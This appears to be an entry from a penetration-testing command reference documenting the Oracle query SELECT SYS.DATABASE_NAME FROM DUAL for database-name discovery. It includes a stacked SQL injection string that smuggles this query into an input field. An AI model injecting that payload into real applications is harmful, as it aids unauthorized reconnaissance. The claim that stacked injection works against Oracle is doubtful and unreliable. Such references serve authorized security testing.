---
type: command
executor: sql
data: SELECT SYS.DATABASE_NAME FROM DUAL;
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Oracle Database
tags:
  - oracle-sql
  - discovery
verified: true
validated: true
---

# oracle-retrieve-system-database-name

## Command

```sql
SELECT SYS.DATABASE_NAME FROM DUAL;
```

## Description

This SQL command invokes the SYS.DATABASE_NAME function using the DUAL table to retrieve the database name, offering a simple, function-based alternative to view queries.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Function call with no arguments; DUAL ensures single-row execution. | N/A |

## Examples

### Basic Usage

```sql
SELECT SYS.DATABASE_NAME FROM DUAL;
```

### Stacked Query Injection

In stacked SQLi, append as a separate statement: `'; SELECT SYS.DATABASE_NAME FROM DUAL; --`

## Expected Output

A single row with the database name, e.g.:

SYS.DATABASE_NAME
-----------------
ORCL

## Related

- [[procedures/Oracle-SQL-Database-Name-Enumeration]]
- [[commands/oracle-retrieve-instance-name]]
